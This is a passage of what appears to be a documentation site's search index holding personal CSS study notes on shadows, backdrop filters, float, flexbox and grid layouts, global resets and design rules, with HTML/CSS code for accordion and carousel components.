0.4em olive;\n\n/*Global values*/\nbox-shadow: inherit;\nbox-shadow: initial;\nbox-shadow: revert;\nbox-shadow: revert-layer;\nbox-shadow: unset;\n</code></pre> <p>Two, three, or four<code>&lt;length&gt;</code> values:</p> <ul> <li>If only two values are given, they are interpreted as <code>&lt;offset-x&gt;</code> and <code>&lt;offset-y&gt;</code> values.</li> <li>If a third value is given, it is interpreted as a <code>&lt;blur-radius&gt;</code>.</li> <li>If a fourth value is given, it is interpreted as a<code>&lt;spread-radius&gt;</code>.</li> </ul> <p>Values</p> <p><code>inset</code> - If not specified (default), the shadow is assumed to be a drop shadow (as if the box were raised above the content). The presence of the <code>inset</code> keyword changes the shadow to one inside the frame (as if the content was debossed inside the box). Inset shadows are drawn inside the border (even transparent ones), above the background, but below content.</p> <p><code>&lt;offset-x&gt;</code>, <code>&lt;offset-y&gt;</code> - These are two <code>&lt;length&gt;</code>values to set the shadow offset. <code>&lt;offset-x&gt;</code> specifies the horizontal distance. Negative values place the shadow to the left of the element. <code>&lt;offset-y&gt;</code> specifies the vertical distance. Negative values place the shadow above the element. If both values are <code>0</code>, the shadow is placed behind the element (and may generate a blur effect if <code>&lt;blur-radius&gt;</code> and/or <code>&lt;spread-radius&gt;</code> is set).</p> <p><code>&lt;blur-radius&gt;</code> - This is a third <code>&lt;length&gt;</code> value. The larger this value, the bigger the blur, so the shadow becomes bigger and lighter. Negative values are not allowed. If not specified, it will be 0 (the shadow's edge is sharp).</p> <p><code>&lt;spread-radius&gt;</code> - This is a fourth<code>&lt;length&gt;</code> value. Positive values will cause the shadow to expand and grow bigger, negative values will cause the shadow to shrink. If not specified, it will be <code>0</code>(the shadow will be the same size as the element).</p> <p><code>&lt;color&gt;</code> - If not specified, it defaults to <code>currentcolor</code>.</p> <p>Design tip</p> <p>The darker the background is, then the more dark the shadow also needs to be.</p> <p>Setting 2 shadows for an element and its hover state</p> <pre><code>.meal {\nbox-shadow: 0 2.4rem 4.8rem rgba(0, 0, 0, 0.075);\n}\n/* the hover shadow is darker, like in reality\nwhen the object gets closer to the source of light */\n.meal:hover {\nbox-shadow: 0 3.2rem 6.4rem rgba(0, 0, 0, 0.06);\n}\n</code></pre> <p>Add border inside of a button</p> <pre><code>.btn--outline:hover,\n.btn--outline:active {\n/* border: 3px solid #fff;*/ /* --&gt; this will not work\n    as expected, becaus it wiil create NEW space in the document */\nbox-shadow: inset 0 0 0 3px #fff;\n}\n</code></pre> </li> <li> <p><code>backdrop-filter: none;</code> - lets you apply graphical effects such as blurring or color shifting to the area behind an element. Because it applies to everything behind the element, to see the effect you must make the element or its background at least partially transparent.</p> <p>Syntax</p> <pre><code>/* Keyword value */\nbackdrop-filter: none;\n\n/*URL to SVG filter*/\nbackdrop-filter: url(commonfilters.svg#filter);\n\n/*&lt;filter-function&gt; values*/\nbackdrop-filter: blur(2px);\nbackdrop-filter: brightness(60%);\nbackdrop-filter: contrast(40%);\nbackdrop-filter: drop-shadow(4px 4px 10px blue);\nbackdrop-filter: grayscale(30%);\nbackdrop-filter: hue-rotate(120deg);\nbackdrop-filter: invert(70%);\nbackdrop-filter: opacity(20%);\nbackdrop-filter: sepia(90%);\nbackdrop-filter: saturate(80%);\n\n/*Multiple filters*/\nbackdrop-filter: url(filters.svg#filter) blur(4px) saturate(150%);\n\n/*Global values*/\nbackdrop-filter: inherit;\nbackdrop-filter: initial;\nbackdrop-filter: revert;\nbackdrop-filter: revert-layer;\nbackdrop-filter: unset;\n</code></pre> <p>Values</p> <p><code>none</code> - No filter is applied to the backdrop.</p> <p><code>&lt;filter-function-list&gt;</code> - A space-separated list of <code>&lt;filter-function&gt;</code>s() or an SVG filter() that will be applied to the backdrop.</p> <p>The <code>&lt;filter-function&gt;</code> data type is specified using one of the filter functions listed below. Each function requires an argument which, if invalid, results in no filter being applied.</p> <ul> <li> <p><code>blur()</code> - Blurs the image.</p> <pre><code>.main-nav {\nbackground-color: rgba(255, 255, 255, 0.75);\nbackdrop-filter: blur(10px);\n}\n</code></pre> </li> <li> <p><code>brightness()</code> - Makes the image brighter or darker.</p> </li> <li><code>contrast()</code> - Increases or decreases the image's contrast.</li> <li><code>drop-shadow()</code> - Applies a drop shadow behind the image.</li> <li><code>grayscale()</code> - Converts the image to grayscale.</li> <li><code>hue-rotate()</code> - Changes the overall hue of the image.</li> <li><code>invert()</code> - Inverts the colors of the image.</li> <li><code>opacity()</code> - Makes the image transparent.</li> <li><code>saturate()</code> - Super-saturates or desaturates the input image.</li> <li><code>sepia()</code> - Converts the image to sepia.</li> </ul> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#other","title":"Other","text":"<ul> <li> <p><code>cursor: pointer;</code> - sets the cursor shape</p> </li> <li> <p><code>list-style: none;</code> - sets the bullet point for the list elements(<code>&lt;li&gt;</code>s inside the <code>&lt;ul&gt;</code> or <code>&lt;ol&gt;</code>)</p> </li> <li> <p><code>scroll-behavior: auto;</code> - sets the behavior for a scrolling box when scrolling is triggered by the navigation or CSSOM scrolling APIs.</p> <p>Note that:</p> <ul> <li>any other scrolls, such as those performed by the user, are not affected by this property</li> <li>when this property is specified on the root element, it applies to the viewport instead</li> <li>this property specified on the body element will not propagate to the viewport</li> <li>user agents are allowed to ignore this property</li> </ul> <p>Syntax</p> <pre><code>/* Keyword values */\nscroll-behavior: auto;\nscroll-behavior: smooth;\n\n/*Global values*/\nscroll-behavior: inherit;\nscroll-behavior: initial;\nscroll-behavior: revert;\nscroll-behavior: revert-layer;\nscroll-behavior: unset;\n</code></pre> <p>Values</p> <p><code>auto</code> - The scrolling box scrolls instantly.</p> <p><code>smooth</code> - The scrolling box scrolls in a smooth fashion using a user-agent-defined timing function over a user-agent-defined period of time. User agents should follow platform conventions, if any.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#layouts","title":"Layouts","text":"<p>Layout:</p> <ul> <li>Layout is the way text, images and other content is placed and arranged on a webpage.</li> <li>Layout gives the page a visual structure, into which we place our content.</li> <li>Building a layout(\u0432\u0435\u0440\u0441\u0442\u043a\u0430): arranging page elements into a visual structure, instead of simply having them placed one after another (normal flow).</li> <li>There are 2 types of layouts: page layout and component layout.</li> <li>There are 3 ways of building layouts with css: Float Layouts, Flexbox and CSS Grid.</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#float-layouts","title":"Float Layouts","text":"<p>The old way of building layouts of all sizes, using the <code>float</code> CSS property. Still used, but getting outdated fast.</p> <p>Float properties:</p> <p><code>float: left;</code>, <code>float: right;</code></p> <ul> <li> <p>Element is removed from the normal flow: \u201cout of flow\u201c(like absolute positioning).</p> </li> <li> <p>Element's content text only (not including element's contetnt area, paddings or margins) and inline elements will wrap around(float around) the floated element.</p> <p>Locating wraped around element right after the floated element</p> <p>If we want the whole wraped around element to start being located right after(on the right/left) of the floated element we should also add <code>float</code> porperty to that wraped around element with the: - same direction value, if we want elements to be \"sticked\" to each other - oppozite direction value, if we want elements to be \"devided\"</p> </li> <li> <p>The container element of the floated element will not adjust its height to that floated element. This phenomena when the container element's height has collapsed is called \"collapsing elements\".</p> <p>Clearing Floats: Solving the \"collapsing elements\" issue.</p> <p>Clearing Floats means ridding off the wrapping around the floating element by its first adjacent element(= clearing the float of that ajacent element). There are two technics to achieve this:</p> <ol> <li> <p>Adding an empty last child element with e.g. <code>clear</code> class to the container element and then style it with the <code>clear</code> property.</p> index.html<pre><code>&lt;header&gt;  &lt;!-- this is a container element --&gt;\n    .  &lt;!-- elements here are floating elements --&gt;\n    .\n    .\n\n    &lt;div class=\"clear\"&gt;&lt;/div&gt; &lt;!-- last child empty element of the container --&gt;\n&lt;/header&gt;\n</code></pre> style.css<pre><code>.clear {\nclear: both; /* other values are: left - for left float and right - for right float */\n}\n</code></pre> <p>This method is a bad practice because we could have many \"collapsing element\"(e.g. when we have a row container element with many columns elements in it) on the page and for each of them we would to add an emtpy container's last child element thereby cluttering our index.html file. Therefore the best practice is to use the second technic below.</p> </li> <li> <p>The Clearfix Hack</p> index.html<pre><code>&lt;header class=\"clearfix\"&gt;  &lt;!-- this is a container element --&gt;\n    .  &lt;!-- elements here are floating elements --&gt;\n    .\n    .\n&lt;/header&gt;\n</code></pre> style.css<pre><code>.clearfix::after {  /* last child empty element of the container */\ncontent: \"\";\ndisplay: block;\nclear: both; /* other values are: left - for left float and right - for right float */\n}\n</code></pre> </li> </ol> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#flexbox","title":"Flexbox","text":"<p>Modern way of laying out elements in a 1-dimensional row without using floats. Perfect for component layouts.</p> <ul> <li>Flexbox is a set of related CSS properties for building 1-dimensional layouts.</li> <li>The main idea behind flexbox is that empty space inside a container element can be automatically divided by its child elements.</li> <li>Flexbox makes it easy to automatically align items to one another inside a parent container, both horizontally and vertically.</li> <li>Flexbox solves common problems such as vertical centering and creating equal-height columns.</li> <li>Flexbox is perfect for replacing floats, allowing us to write fewer and cleaner HTML and CSS code.</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#flexbox-properties","title":"Flexbox Properties","text":"<p><code>align-items</code> - pay attention that the margins of the flex itmes also taken in account when using this property!</p> <p><code>flex-grow</code> - determines whether the element are allowed to grow as large as it can(to fill up the remaining width of the flex container) or not(in this the element would simply occupy the width that it need to fit its content area). If <code>flex-grow: [amy number greater than 1];</code> set for all flex items, then the remaining width of the flex container devided evenly between them, so this makes them to have the same witdh. BUT if, for instance, when all flex items set to <code>flex-grow: 1;</code> exept one item that set to <code>flex-grow: 2;</code>, then it means that this item will have double of the devided remaining width of the flex container comparing to the devided remaining width of all other items. Ussually we set <code>flex-grow: 1;</code> to all of the flex items to basically having all the elements expanding in order to fill the container's empty space.</p> <p><code>flex-shrink</code> - determines whether flexbox is allowed to shrink element(in orfer to fit to the width of the flex container) if necessary or not. Ussually we don't need to change the default <code>1</code> value.</p> <p><code>flex</code> - as a best practice we should always use this property instead of <code>flex-grow</code>, <code>flex-shrink</code> and <code>flex-basis</code>.</p>"},{"location":"Dev/Prg/Langs/Css/#css-grid","title":"CSS Grid","text":"<p>For laying out element in a fully-fledged(\u043f\u043e\u043b\u043d\u043e\u0446\u0435\u043d\u043d\u044b\u0439) 2-dimensional grid. Perfect for page layouts and complex components.</p> <ul> <li>CSS Grid is a set of CSS properties for building 2-dimensional layouts.</li> <li>The main idea behind CSS Grid is that we divide a container element into rows and columns that can be filled with its child elements.</li> <li>In two-dimensional contexts, CSS Grid allows us to write less nested HTML and easier-to-read CSS.</li> <li>CSS Grid is not meant to replace flexbox! Instead, they work perfectly together. Need a 1D layout? Use flexbox. Need a 2D layout? Use CSS Grid.</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#css-grid-properties","title":"CSS Grid Properties","text":"<p><code>display: grid;</code> - defines a grid container. By default CSS grid places its grid items into rows(one after another).</p> <p><code>grid-template-rows/columns: &lt;track-size&gt;*;</code></p> <ul> <li> <p>If one(or more) of the grid items has its own defined width/height and these dimension are higher then of the grid tracks' ones(<code>&lt;track-size&gt;</code>s), then the grid tracks' sizes will be defined by that grid items dimensions(or by highest dimensions among these items), otherwise they are defined wether by <code>&lt;track-size&gt;</code>s or by highest grid items' content area dimensions(when <code>&lt;track-size&gt;</code> &lt; content area dimensions).</p> </li> <li> <p><code>fr</code> unit - stands for fractional or just fraction. When set the grid item width can be maximally shrinked to its content area width.</p> <p>If, for instace, we set <code>grid-template-rows: 2fr 100px 100px 1fr;</code> then the first track width(<code>2fr</code>) will take double of the grid container's remaining width comaring to the last track width(<code>1fr</code>).</p> <p>Usually the <code>fr</code> unit is actually more helpful on columns.</p> <p>So in fact, in many situations, it's actually enough to only define columns and let the rows be filled automatically by whatever content they contain.</p> </li> <li> <p><code>auto</code> unit - set the track size to always fit the grid item's conten area size.</p> </li> <li> <p><code>repeat(&lt;number of tracks&gt;, &lt;trakc size&gt;);</code> - a shorhand to define similar sized tracks, e.g.: <code>grid-template-columns: repeat(4, 1fr);</code></p> </li> </ul> <p><code>grid-column/row: &lt;start line&gt; / &lt;end line&gt; | span &lt;number&gt;;</code></p> <ul> <li> <p><code>&lt;start line&gt; / &lt;end line&gt;</code> - if <code>&lt;end line&gt;</code> &gt; <code>&lt;start line&gt;</code> then we can ommit it, e.g.: <code>grid-column: 2 / 3;</code> \u2192 <code>grid-column: 2;</code></p> </li> <li> <p>Spanning item across multiple grid cells: when <code>&lt;end line&gt;</code> &gt; <code>&lt;start line&gt;</code> more than by 1, then the grid item will span across <code>&lt;end line&gt; - &lt;start line&gt;</code> number of cells(the span number).</p> <p>Instead of specifying the <code>&lt;end line&gt;</code> we can use a shorthand for this, e.g.: <code>grid-column: 1 / 4;</code> \u2192 <code>grid-column: 1 / span 3;</code> (<code>span 3</code> means span across three cells).</p> <p>Spannig one elemnt all the way to the end.</p> <p>In some situations, we might not even know how many columns there are in a grid, or we might simply not want to think about how many cells we need to span. For this we can use following trick: <code>grid-column: 1 / -1;</code></p> </li> </ul> <p><code>justify-items</code> and <code>align-items</code>: aligning items inside cells - is all about moving items around inside cells.</p> <p><code>justify-content</code> and <code>align-content</code>: aligning tracks inside of the grid container - is all about distributing containers' empty space.</p>"},{"location":"Dev/Prg/Langs/Css/#tips-tricks","title":"Tips &amp; Tricks","text":""},{"location":"Dev/Prg/Langs/Css/#keeping-aspect-ratio-of-images","title":"Keeping aspect ratio of images","text":"<p>If we don't specified <code>width</code> / <code>height</code> HTML attributes for the <code>&lt;img /&gt;</code> element then setting just one of the <code>width</code> or <code>height</code> CSS property will keep the aspect ratio. BUT if we do specified all or one of these HTML attributes then to keep aspect ratio while setting up just one of the <code>width</code> or <code>height</code> CSS property we will need to specify the remaining property to the value of <code>auto</code>, e.g.:</p> <pre><code>.post-img {\nwidth: 800px;\nheight: auto;\n}\n</code></pre>"},{"location":"Dev/Prg/Langs/Css/#centering-a-page-inside-of-the-browser","title":"Centering a page inside of the browser","text":"index.htnl<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n    &lt;link href=\"style.css\" rel=\"stylesheet\" /&gt;\n&lt;/head&gt;\n    &lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        .\n        .\n        .\n    &lt;/div&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> style.css<pre><code>/* OPTION 1 */\n.container {\n/* we actually need to give this container a width because otherwise\n    there is not really anything to center, and so all the element inside\n    this container will able to have maximum this widh. And this is not\n    \"inheritance\" but a simple logic that the child element can never be wider than the parent element.*/\nwidth: 800px;\n/* centering container inside of the &lt;body&gt; element */\nmargin: 0 auto;\n\n/* OPTION 2 */\n/* Here we don't need to define width for the container.\n    The flexbox container width is defined by all the flex items' widths added together! */\n.body {\ndisplay: flex;\njustify-content: center;\n}\n}\n</code></pre>"},{"location":"Dev/Prg/Langs/Css/#global-reset","title":"Global Reset","text":"<p>Before adding <code>marging</code>s,<code>padding</code>s and other properties to elements on the page we should remove/set all default instaces of these properties' values as follows:</p> <pre><code>* {\n/* whenever we use zero, we do not specify any unit after it */\nmargin: 0;\npadding: 0;\n/* setting up an alternative box-model where `width` and `height`\n    (and respective `min` / `max` properties) on the element\n    determine the border box of the element */\nbox-sizing: border-box;\n}\n\n/* Percentage of user's browser font-size setting! */\nhtml {\nfont-size: 62.5%; /* 10px / 16px = 0.625 = 62.5%  */\n/* disabling page sidewise scrolling,\n    useful to hide elements triggered by event, e.g. 'mobile navigation' */\noverflow-x: hidden;\nscroll-behavior: smooth; /* sets the viewport to scroll in a smooth fashion */\n}\n\nbody {\n/* setting font-family for our design(with fallback 'sans-serif'),\n    its color to be non-completely black\n    and reseting its predefined line-height to 1 */\nfont-family: \"Inter\", sans-serif;\ncolor: #555; /* or #343a40(more blueish from Open Color) */\nline-height: 1;\nfont-weight: 400;\n}\n</code></pre> <p>Without doing this it is quite hard to style the page.</p> <p>Global Reset hides numbers and bullet poits of <code>&lt;ol&gt;</code>, <code>&lt;ul&gt;</code> lists</p> <p>In order to reveal them back we should set <code>margin-left</code> for them, e.g. <code>ul, ol { margin-left: 50px; }</code></p>"},{"location":"Dev/Prg/Langs/Css/#web-design","title":"Web Design","text":""},{"location":"Dev/Prg/Langs/Css/#rule-1-typography","title":"Rule #1: Typography","text":"<p>Free fonts:</p> <ul> <li>Google Fonts</li> </ul> <p>Typeface frameworks:</p> <p>+</p> <p>Embedding free font:</p> index.html<pre><code>&lt;head&gt;\n    .\n    .\n    .\n    &lt;link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"&gt;\n    &lt;link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin&gt;\n    &lt;link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;display=swap\" rel=\"stylesheet\"&gt;\n    .\n    .\n    .\n&lt;/head&gt;\n</code></pre> style.css<pre><code>body {\nfont-family: 'Inter', sans-serif; /* setting 'sans-serif' here as a backup font in case of issues with loading of 'Inter' font */\n}\n</code></pre> <p>Typeface framework for font size (best to be placed at the top of the CSS file for reference):</p> style.css<pre><code>/*\n- Font sizes (px)\n10 / 12 / 14 / 16 / 18 / 20 / 24 / 30 / 36 / 44 / 52 / 62 / 74 / 86 / 98\n*/\n</code></pre>"},{"location":"Dev/Prg/Langs/Css/#rule-2-colors","title":"Rule #2: Colors","text":"<p>Color Schemes:</p> <ul> <li>Open-color</li> <li>Coolors</li> </ul> <p>Contrast checkers:</p> <ul> <li>Coolors</li> </ul> <p>Color system may be placed at the top of the CSS file for reference, e.g.:</p> style.css<pre><code>/*\nMAIN COLOR: #087f5b\nGREY COLOR: #343a40\n*/\n</code></pre>"},{"location":"Dev/Prg/Langs/Css/#rule-3-images","title":"Rule #3: Images","text":""},{"location":"Dev/Prg/Langs/Css/#rule-4-icons","title":"Rule #4: Icons","text":"<p>Icon Packs:</p> <ul> <li>Heroicons</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#rule-5-shadows","title":"Rule #5: Shadows","text":"<p>Following properties used for setting shadows:</p> <ul> <li> <p><code>box-shadow: 0 20px 30px 0 rgba(0, 0, 0, 0.07);</code> - used to set box shadow</p> <p>More than one comma separated shadows can be created using this 5 values(from left to right):</p> <ul> <li><code>0</code> - horizontal offset between the box and the shadow</li> <li><code>20px</code> - vertical offset between the box and the shadow</li> <li><code>30px</code> - blur of the shadow(larger value \u2192 more blur)</li> <li><code>0</code> - scales the shadow up(optional)</li> <li><code>rgba(0, 0, 0, 0.07)</code> - color of the shadow</li> </ul> </li> <li> <p><code>text-shadow: 0 5px 5px rgba(0, 0, 0, 0.2);</code> - used to set text shadow</p> <p>More than one comma separated shadows can be created using this 4 values(from left to right):</p> <ul> <li><code>0</code> - horizontal offset between the box and the shadow</li> <li><code>5px</code> - vertical offset between the box and the shadow</li> <li><code>5px</code> - blur of the shadow(larger value \u2192 more blur)</li> <li><code>rgba(0, 0, 0, 0.2)</code> - color of the shadow</li> </ul> <p>Usage: As yet another technique of handling texts on top of images.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#rule-6-border-radius","title":"Rule #6: Border-radius","text":"<p>Following properties used for setting border-radius:</p> <ul> <li> <p><code>border-raius: 12px;</code> - a shorthand for: <code>border-bottom-left-radius</code> <code>border-top-left-radius</code> <code>border-bottom-right-radius</code> <code>border-top-right-radius</code></p> <p>Setting completely rounded border-radius</p> <p>If an element is a square: <code>border-raius: 50%;</code></p> <p>If an element is a rectangle: <code>border-raius: 100px;</code> - the rule here is too use big enough value, so it is bigger than the <code>height</code> length of the element.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#rule-7-whitespace","title":"Rule #7: Whitespace","text":"<p>Spacing framework for whitespace handling (best to be placed at the top of the CSS file for reference):</p> style.css<pre><code>/*\n- Spacing system (px)\n2 / 4 / 8 / 12 / 16 / 24 / 32 / 48 / 64 / 80 / 96 / 128\n*/\n</code></pre>"},{"location":"Dev/Prg/Langs/Css/#rule-8-visual-hierarchy","title":"Rule #8: Visual Hierarchy","text":""},{"location":"Dev/Prg/Langs/Css/#rule-9-user-experience-ux","title":"Rule #9: User Experience (UX)","text":""},{"location":"Dev/Prg/Langs/Css/#rule-10-components-and-layouts","title":"Rule #10: Components and Layouts","text":""},{"location":"Dev/Prg/Langs/Css/#elements-and-componenets","title":"Elements and Componenets","text":"Accordion component <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n\n  &lt;link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"&gt;\n  &lt;link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin&gt;\n  &lt;link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;display=swap\" rel=\"stylesheet\"&gt;\n\n  &lt;title&gt;Accordion Component&lt;/title&gt;\n\n  &lt;style&gt;\n\n* {\nmargin: 0;\npadding: 0;\nbox-sizing: border-box;\n}\n\nbody {\nfont-family: 'Inter', sans-serif;\ncolor: #343a40;\nline-height: 1;\n}\n\n.accordion {\nwidth: 700px;\nmargin: 100px auto;\n\ndisplay: flex;\nflex-direction: column;\ngap: 24px;\n}\n\n.item {\nbox-shadow: 0 0 32px rgba(0, 0, 0, 0.1);\npadding: 24px;\n\ndisplay: grid;\ngrid-template-columns: auto 1fr auto;\ncolumn-gap: 24px;\nrow-gap: 32px;\nalign-items: center;\n}\n\n.number,\n.text {\nfont-size: 24px;\nfont-weight: 500;\n/* color: #087f5b; */\n}\n\n.number {\ncolor: #ced4da;\n}\n\n.icon {\nwidth: 24px;\nheight: 24px;\nstroke: #087f5b;\n}\n\n.hidden-box {\ngrid-column: 2;\ndisplay: none;\n}\n\n.hidden-box p {\nline-height: 1.6;\nmargin-bottom: 24px;\n}\n\n.hidden-box ul {\ncolor: #868e96;\nmargin-left: 20px;\n\ndisplay: flex;\nflex-direction: column;\ngap: 12px;\n}\n\n/* OPEN STATE */\n.open {\nborder-top: 4px solid #087f5b;\n}\n\n.open .hidden-box {\ndisplay: block;\n}\n\n.open .number,\n.open .text {\ncolor: #087f5b;\n}\n\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;div class=\"accordion\"&gt;\n    &lt;div class=\"item\"&gt;\n    &lt;p class=\"number\"&gt;01&lt;/p&gt;\n    &lt;p class=\"text\"&gt;Where are these chairs assembled?&lt;/p&gt;\n    &lt;svg xmlns=\"http://www.w3.org/2000/svg\" fill=\"none\" viewBox=\"0 0 24 24\" stroke-width=\"1.5\" stroke=\"currentColor\"\n        class=\"icon\"&gt;\n        &lt;path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M19.5 8.25l-7.5 7.5-7.5-7.5\" /&gt;\n    &lt;/svg&gt;\n    &lt;div class=\"hidden-box\"&gt;\n        &lt;p&gt;\n        Lorem ipsum dolor sit amet consectetur adipisicing elit. Iure blanditiis velit iste exercitationem accusantium\n        tenetur quidem odit aspernatur! Enim est quibusdam illo unde repudiandae, at tempore exercitationem sapiente\n        velit necessitatibus.\n        &lt;/p&gt;\n        &lt;ul&gt;\n        &lt;li&gt;Lorem ipsum dolor, sit amet consectetur adipisicing elit. &lt;/li&gt;\n        &lt;li&gt;Laudantium commodi nulla porro quasi error.&lt;/li&gt;\n        &lt;li&gt;Harum veniam laborum sed dolorem nulla temporibus.&lt;/li&gt;\n        &lt;li&gt;Praesentium dicta, reprehenderit nisi in quam eum.\n        &lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/div&gt;\n    &lt;/div&gt;\n    &lt;div class=\"item open\"&gt;\n    &lt;p class=\"number\"&gt;02&lt;/p&gt;\n    &lt;p class=\"text\"&gt;How long do I have to return my chair?&lt;/p&gt;\n    &lt;svg xmlns=\"http://www.w3.org/2000/svg\" fill=\"none\" viewBox=\"0 0 24 24\" stroke-width=\"1.5\" stroke=\"currentColor\"\n        class=\"icon\"&gt;\n        &lt;path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M19.5 8.25l-7.5 7.5-7.5-7.5\" /&gt;\n    &lt;/svg&gt;\n    &lt;div class=\"hidden-box\"&gt;\n        &lt;p&gt;\n        Lorem ipsum dolor sit amet consectetur adipisicing elit. Iure blanditiis velit iste exercitationem accusantium\n        tenetur quidem odit aspernatur! Enim est quibusdam illo unde repudiandae, at tempore exercitationem sapiente\n        velit necessitatibus.\n        &lt;/p&gt;\n        &lt;ul&gt;\n        &lt;li&gt;Lorem ipsum dolor, sit amet consectetur adipisicing elit. &lt;/li&gt;\n        &lt;li&gt;Laudantium commodi nulla porro quasi error.&lt;/li&gt;\n        &lt;li&gt;Harum veniam laborum sed dolorem nulla temporibus.&lt;/li&gt;\n        &lt;li&gt;Praesentium dicta, reprehenderit nisi in quam eum.\n        &lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/div&gt;\n    &lt;/div&gt;\n    &lt;div class=\"item\"&gt;\n    &lt;p class=\"number\"&gt;03&lt;/p&gt;\n    &lt;p class=\"text\"&gt;Do you ship to countries outside the EU?&lt;/p&gt;\n    &lt;svg xmlns=\"http://www.w3.org/2000/svg\" fill=\"none\" viewBox=\"0 0 24 24\" stroke-width=\"1.5\" stroke=\"currentColor\"\n        class=\"icon\"&gt;\n        &lt;path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M19.5 8.25l-7.5 7.5-7.5-7.5\" /&gt;\n    &lt;/svg&gt;\n    &lt;div class=\"hidden-box\"&gt;\n        &lt;p&gt;\n        Lorem ipsum dolor sit amet consectetur adipisicing elit. Iure blanditiis velit iste exercitationem accusantium\n        tenetur quidem odit aspernatur! Enim est quibusdam illo unde repudiandae, at tempore exercitationem sapiente\n        velit necessitatibus.\n        &lt;/p&gt;\n        &lt;ul&gt;\n        &lt;li&gt;Lorem ipsum dolor, sit amet consectetur adipisicing elit. &lt;/li&gt;\n        &lt;li&gt;Laudantium commodi nulla porro quasi error.&lt;/li&gt;\n        &lt;li&gt;Harum veniam laborum sed dolorem nulla temporibus.&lt;/li&gt;\n        &lt;li&gt;Praesentium dicta, reprehenderit nisi in quam eum.\n        &lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> Carousel(=Slider) component <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n\n&lt;link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"&gt;\n&lt;link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin&gt;\n&lt;link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;display=swap\" rel=\"stylesheet\"&gt;\n\n&lt;title&gt;Carousel Component&lt;/title&gt;\n\n&lt;style&gt;\n\n* {\nmargin: 0;\npadding: 0;\nbox-sizing: border-box;\n}\n\nbody {\nfont-family: 'Inter', sans-serif;\ncolor: #343a40;\nline-height: 1;\n}\n\n.carousel {\nwidth: 800px;\nmargin: 100px auto;\nbackground: #087f5b;\npadding: 32px 48px 32px 86px;\nborder-radius: 8px;\nposition: relative;\n\ndisplay: flex;\nalign-items: center;\ngap: 86px;\n}\n\nimg {\nheight: 200px;\nborder-radius: 8px;\ntransform: scale(1.5);\nbox-shadow: 0 12px 24px rgba(0, 0, 0, 0.25);\n}\n\n.testimonial-text {\nfont-size: 18px;\nfont-weight: 500;\nline-height: 1.5;\nmargin-bottom: 32px;\ncolor: #e6fcf5;\n}\n\n.testimonial-author {\nfont-size: 14px;\nmargin-bottom: 4px;\ncolor: #e6fcf5;\n}\n\n.testimonial-job {\nfont-size: 12px;\ncolor: #e6fcf5;\n}\n\n/*CONTROLS*/\n.btn {\nbackground: #fff;\nborder: none;\nwidth: 40px;\nheight: 40px;\nborder-radius: 50%;\nposition: absolute;\ncursor: pointer;\n\ndisplay: flex;\nalign-items: center;\njustify-content: center;\n}\n\n.btn--left {\n/*In relation to PARENT ELEMENT*/\nleft: 0;\ntop: 50%;\n\n/*In relation to ELEMENT ITSELF*/\ntransform: translate(-50%, -50%);\nbox-shadow: 0 12px 24px rgba(0, 0, 0, 0.2);\n}\n\n.btn--right {\nright: 0;\ntop: 50%;\ntransform: translate(50%, -50%);\nbox-shadow: 0 12px 24px rgba(0, 0, 0, 0.2);\n}\n\n.btn-icon {\nheight: 24px;\nwidth: 24px;\nstroke: #087f5b;\n}\n\n.dots {\nposition: absolute;\nleft: 50%;\nbottom: 0;\ntransform: translate(-50%, 32px);\n\ndisplay: flex;\ngap: 12px;\n}\n\n.dot {\nheight: 12px;\nwidth: 12px;\nbackground-color: #fff;\nborder: 2px solid #087f5b;\nborder-radius: 50%;\ncursor: pointer;\n}\n\n.dot--fill {\nbackground-color: #087f5b;\n}\n\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;div class=\"carousel\"&gt;\n    &lt;img src=\"maria.jpg\" alt=\"Maria de Almeida\"&gt;\n    &lt;blockquote class=\"testimonial\"&gt;\n    &lt;p 